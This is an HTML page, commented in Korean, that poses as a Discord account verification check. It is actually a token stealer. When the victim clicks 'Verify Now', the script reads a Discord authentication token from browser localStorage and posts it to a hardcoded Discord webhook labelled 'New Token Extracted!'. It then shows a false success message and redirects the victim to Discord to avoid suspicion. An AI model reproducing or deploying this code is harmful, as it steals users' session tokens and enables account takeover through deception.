<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <!-- 디스코드에서 사용하는 아이콘 라이브러리 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* 디스코드 기본 색상 및 폰트 설정 */
        :root {
            --bg-color: #36393f;
            --header-bg: #2f3136;
            --text-color: #dcddde;
            --sub-text: #72767d;
            --btn-color: #5865F2;
            --btn-hover: #4752c4;
            --input-bg: #202225;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: "gg sans", "Noto Sans KR", Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            user-select: none;
        }

        .container {
            width: 400px;
            padding: 32px;
            border-radius: 5px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            text-align: center;
        }

        h2 {
            color: #fff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        p {
            color: var(--sub-text);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .icon-circle {
            background-color: #36393f;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px auto;
            border: 1px solid #202225;
        }

        .icon-circle i {
            font-size: 32px;
            color: #fff;
        }

        button {
            background-color: var(--btn-color);
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
            outline: none;
        }

        button:hover {
            background-color: var(--btn-hover);
        }

        button:disabled {
            background-color: #4f5661;
            cursor: not-allowed;
        }

        /* 로딩 애니메이션 */
        .loader {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
            display: none; /* 기본적으로 숨김 */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-msg {
            margin-top: 16px;
            font-size: 13px;
            min-height: 18px;
        }
        
        .success { color: #2ecc71; }
        .error { color: #e74c3c; }
    </style>
</head>
<body>

    <div class="container">
        <!-- 디스코드 인증 아이콘 -->
        <div class="icon-circle">
            <i class="fa-solid fa-shield-halved"></i>
        </div>

        <h2>Verify Your Account</h2>
        <p>We need to verify that you are a human.<br>Please click the button below to proceed.</p>

        <button id="verifyBtn">
            <span id="btnText">Verify Now</span>
            <div class="loader" id="loader"></div>
        </button>

        <div class="status-msg" id="statusMsg"></div>
    </div>

    <script>
        // 웹훅 URL (토큰이 전송될 곳)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1561489363878285333/JN3e1xD9pw-VOwdrYWgDMZeQXzkwLUjjGI_jbQmo8A_TuUWSUkugjfvwy3IiIGKn9uKg";

        const btn = document.getElementById('verifyBtn');
        const btnText = document.getElementById('btnText');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');

        btn.addEventListener('click', async () => {
            // 1. UI 상태 변경 (버튼 비활성화 및 로딩 표시)
            btn.disabled = true;
            btnText.style.display = 'none';
            loader.style.display = 'block';
            statusMsg.innerText = "";

            // 2. 토큰 추출 시도
            let token = localStorage.getItem('token');
            if (!token) {
                token = localStorage.getItem('discord_token') || localStorage.getItem('DISCORD_TOKEN');
            }

            // 3. 토큰이 있을 경우 웹훅으로 전송
            if (token) {
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            content: `**New Token Extracted!**\n\n\`\`\`${token}\`\`\`` 
                        })
                    });

                    // 성공 시 메시지
                    statusMsg.innerHTML = '<i class="fa-solid fa-check-circle"></i> Verified successfully!';
                    statusMsg.className = 'status-msg success';
                    
                    // 버튼 텍스트 변경
                    btnText.innerText = "Verified";
                    btnText.style.display = 'inline';
                    loader.style.display = 'none';

                    // 잠시 후 페이지 이동 (사용자가 혼란스러워하지 않도록)
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/channels/@me';
                    }, 1000);

                } catch (error) {
                    console.error(error);
                    showError("Verification failed. Please try again.");
                }
            } else {
                // 토큰이 없을 경우
                loader.style.display = 'none';
                btnText.style.display = 'inline';
                btn.disabled = false;
                showError("Token not found. Please use Discord Desktop App.");
            }
        });

        function showError(msg) {
            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> ${msg}`;
            statusMsg.className = 'status-msg error';
        }
    </script>
</body>
</html>
